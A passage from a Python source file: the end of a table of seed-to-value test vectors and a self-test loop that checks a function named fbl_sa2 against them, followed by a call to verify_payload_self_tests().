        0x00000001: 0x7DAD27A0,
        0x12345678: 0x7CA16271,
        0xDEADBEEF: 0x3AEE8BB5,
        0xFFFFFFFF: 0xEAE26413,
    }
    for seed, expected in sa2_vectors.items():
        if fbl_sa2(seed) != expected:
            raise RuntimeError(f"SA2 self-test failed for seed 0x{seed:08X}")


verify_payload_self_tests()
